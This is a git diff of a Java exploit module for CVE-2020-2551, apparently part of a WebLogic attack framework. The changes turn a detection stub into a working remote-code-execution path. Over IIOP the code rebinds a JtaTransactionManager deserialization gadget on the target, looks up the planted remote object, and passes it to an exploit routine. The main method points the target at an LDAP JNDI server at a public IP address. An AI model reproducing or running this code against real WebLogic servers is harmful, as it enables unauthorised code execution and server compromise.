@@ -22,6 +22,8 @@ import com.weblogic.framework.entity.MyException;
 import com.weblogic.framework.gadget.ObjectGadget;
 import com.weblogic.framework.gadget.impl.JtaTransactionManagerGadget;
 import com.weblogic.framework.entity.VulCheckParam;
+import com.weblogic.framework.utils.ReflectionUtils;
+import com.weblogic.framework.utils.VulUtils;
 import com.weblogic.framework.vuls.VulTest;
 import org.apache.commons.lang3.StringUtils;
 import javax.naming.Context;
@@ -79,7 +81,7 @@ public class CVE_2020_2551 implements VulTest {
     /**
      * bind name
      */
-    private String bindName;
+    private String bindName = "";
 
     /**
      * 漏洞验证,漏洞存在返回 true 否则返回 false
@@ -89,7 +91,7 @@ public class CVE_2020_2551 implements VulTest {
      * @throws Exception 抛出异常
      */
     public Boolean vulnerable(String url, VulCheckParam vulCheckParam) throws Exception{
-        url = checkUrl(url);
+//        url = checkUrl(url);
         URL checkURL = new URL(url);
         String ip = checkURL.getHost();
         Integer port = checkURL.getPort() == -1 ? checkURL.getDefaultPort():checkURL.getPort();
@@ -120,19 +122,22 @@ public class CVE_2020_2551 implements VulTest {
         String iiopUrl = String.format("iiop://%s:%s", ip, port);
         try{
             Context context = getContext(iiopUrl);
+            this.currentContext = context;
             context.rebind("hello",object);
         }catch (Exception e){
-            String msg = e.getMessage();
-            if(msg.contains("Unhandled exception in rebind()")){
-                return true;
-            }else{
-                return false;
-            }
+            e.printStackTrace();
+            //
         }finally {
             urlClassLoader = null;
             System.gc();
         }
-        return false;
+        try{
+            Object objectCall = this.currentContext.lookup("hello");
+            this.remote = objectCall;
+        }catch (Exception e){
+            return false;
+        }
+        return true;
     }
 
     /**
@@ -144,12 +149,14 @@ public class CVE_2020_2551 implements VulTest {
      */
     @Override
     public String exploit(String url, String... param) throws Exception {
-        throw new MyException(this.getClass().getSimpleName().replace("_","-")+" 不支持回显");
+//        throw new MyException(this.getClass().getSimpleName().replace("_","-")+" 不支持回显");
+        return VulUtils.exploit(url, remote, param);
     }
 
     public static void main(String[] args) throws Exception {
         CVE_2020_2551 vul = new CVE_2020_2551();
         String jndiUrl = "ldap://192.168.1.6:1099/poc";
+        jndiUrl = "ldap://36.110.239.156:1099/poc";
 //        jdnUrl = "ldap://10.10.10.172:1099/poc";
 //        System.out.println(vul.vulnerable("10.10.10.172", 7001,jdnUrl));
 //        System.out.println(vul.vulnerable("10.10.10.168", 7001,jdnUrl));
@@ -158,9 +165,10 @@ public class CVE_2020_2551 implements VulTest {
 //        System.out.println(vul.vulnerable("10.10.10.165", 7001,jdnUrl));
         VulCheckParam param = new VulCheckParam();
         param.setJndiUrl(jndiUrl);
-        vul.vulnerable("http://192.168.1.9:7001/",param);
-        vul.vulnerable("http://192.168.1.12:7001/", param);
-        vul.vulnerable("http://192.168.1.3:7001/", param);
-        vul.vulnerable("http://192.168.1.3:7001/", param);
+        vul.vulnerable("http://10.128.148.47:7001/",param);
+//        vul.vulnerable("http://192.168.1.9:7001/",param);
+//        vul.vulnerable("http://192.168.1.12:7001/", param);
+//        vul.vulnerable("http://192.168.1.3:7001/", param);
+//        vul.vulnerable("http://192.168.1.3:7001/", param);
     }
 }
